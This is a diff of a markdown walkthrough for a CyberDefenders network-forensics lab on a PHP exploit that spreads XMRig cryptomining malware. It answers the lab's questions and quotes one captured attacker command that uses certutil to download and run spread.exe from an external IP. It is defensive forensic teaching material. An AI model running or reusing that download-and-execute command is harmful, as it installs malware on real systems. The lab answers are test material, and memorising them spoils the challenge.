@@ -21,7 +21,7 @@ This is a **medium** level **network forensic** lab by **CyberDefenders**. You c
 
 ### Q2 A specific Unicode character is used in the exploit to manipulate how the server interprets command-line arguments, bypassing the standard input handling. What is the Unicode code point of this character?
 
-- After visiting the first link mentioned in the last screenshot. We can see that `0xAD`unicode character being used in the exploit. You can verify by visiting [here](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure)  ![Q2](/static/images/RCEMiner/Q2.png)
+- After visiting the first link mentioned in the last screenshot. We can see that `0xAD`unicode character being used in the exploit. You can verify by visiting [here](https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure) ![Q2](/static/images/RCEMiner/Q2.png)
 
 ### Q3 The attacker executed commands to gather detailed system information, including CPU specifications, after gaining access. What is the exact model of the CPU identified by the attacker’s script?
 
@@ -31,7 +31,7 @@ This is a **medium** level **network forensic** lab by **CyberDefenders**. You c
 
 ### Q4 Understanding how malware initiates the execution of downloaded files is crucial for stopping its spread and execution. After downloading the file, the malware executed it with elevated privileges to ensure its operation. What command was used to start the process with elevated permissions?
 
-- I started by searching for the `Start-Process` Powershell method which  is commonly used by attackers to run something with super user privileges. On following the `HTTP Stream` on first packet ![Q4](/static/images/RCEMiner/Q4.png)
+- I started by searching for the `Start-Process` Powershell method which is commonly used by attackers to run something with super user privileges. On following the `HTTP Stream` on first packet ![Q4](/static/images/RCEMiner/Q4.png)
 - We could see that the attacker executed a command which starts a process `2.exe` with root privileges ![Q4-1](/static/images/RCEMiner/Q4-1.png)
 
 ### Q5 After compromising the server, the malware used it to launch a massive number of HTTP requests containing malicious payloads, attempting to exploit vulnerabilities on additional websites. What vulnerable PHP framework was initially targeted by these outbound attacks from the compromised server?
@@ -42,7 +42,7 @@ This is a **medium** level **network forensic** lab by **CyberDefenders**. You c
 ### Q6 The malware leveraged a common network protocol to facilitate its communication with external servers, blending malicious activities with legitimate traffic. This technique is documented in the MITRE ATT&CK framework. What is the specific sub-technique ID that involves the use of DNS queries for command-and-control purposes?
 
 - Twitter, IRC, HTTPs, DNS are commonly used by attackers for C2. Most try to blend in as much as possible. It helps attackers avoid detection and sometimes this makes it quite challenging for many of us to notice at first sight.
-- Start by opening up `MITRE ATT&CK` Enterprise Framework which includes all the MITRE's TTPs or  common methods used by the attackers to carry out their malicious activities. Move to `Command and Control` section, you'll end up seeing a page like this  ![Q6](/static/images/RCEMiner/Q6.png)
+- Start by opening up `MITRE ATT&CK` Enterprise Framework which includes all the MITRE's TTPs or common methods used by the attackers to carry out their malicious activities. Move to `Command and Control` section, you'll end up seeing a page like this ![Q6](/static/images/RCEMiner/Q6.png)
 - Since the question asks specifically for the MITRE C2 Technique including its sub technique used for communication using DNS queries. Our flag should be `T1071.004` in this scenario ![Q6-1](/static/images/RCEMiner/Q6-1.png)
 
 ### Q7 Identifying where the malware could be stored on a compromised system is crucial for ensuring the complete removal of the infection and preventing the malware from being executed again. The compromised server was used to host a malicious file, which was then delivered to other vulnerable websites. What is the full path where this malware was stored after being downloaded from the compromised server?
@@ -50,7 +50,7 @@ This is a **medium** level **network forensic** lab by **CyberDefenders**. You c
 - Query -> `http contains "exe" and http.request.method == POST`
 - Using the above query, we can analyze the POST request in each packet. You will end up with one common malicious POST Request being made in most of the HTTP requests ![Q7](/static/images/RCEMiner/Q7.png)
 
-``` powershell
+```powershell
 cmd.exe /c certutil -urlcache -split -f http://36.96.48.3:19490/spread.txt C:\ProgramData\spread.exe && C:\ProgramData\spread.exe
 ```
 
@@ -64,10 +64,9 @@ cmd.exe /c certutil -urlcache -split -f http://36.96.48.3:19490/spread.txt C:\Pr
 
 ### Q9 Identifying the specific cryptomining software used by the attacker allows for better detection and removal of similar threats in the future. The malware deployed specific software to utilize the compromised server's resources for cryptomining. What mining software and version was used?
 
-- We know from `Q1`  the CVE of this Vulnerability and we also know that the attacker makes use of `XMRig` for mining `Monero`. I start by checking if any frame contains `XMRig` because it could be possible that the attacker uses another software for mining but here we could see `XMRig` being used. Follow `HTTP Stream` on any of the packet ![Q9](/static/images/RCEMiner/Q9.png)
+- We know from `Q1` the CVE of this Vulnerability and we also know that the attacker makes use of `XMRig` for mining `Monero`. I start by checking if any frame contains `XMRig` because it could be possible that the attacker uses another software for mining but here we could see `XMRig` being used. Follow `HTTP Stream` on any of the packet ![Q9](/static/images/RCEMiner/Q9.png)
 - We could see mining software along with its version and that should be our last flag for this lab `XMRig/5.5.0` ![Q9](/static/images/RCEMiner/Q9-1.png)
 
 Here's another great report if you want to check each IOC of this malware in detail. This malware is quite relevant in today's scenario of cybersecurity, you will commonly see it in top 10 or 20 of any.run trends. Check out analysis from [filescan.io](https://www.filescan.io/uploads/666c55d4910ce98966f9a44a/reports/3978492e-edf4-4757-96be-b7d94c06d67b/overview)
 
-
-> If you've made this far, thank you for sticking by and congrats on completing this lab
+> If you've made this far, thank you for sticking by and congrats on completing this lab!
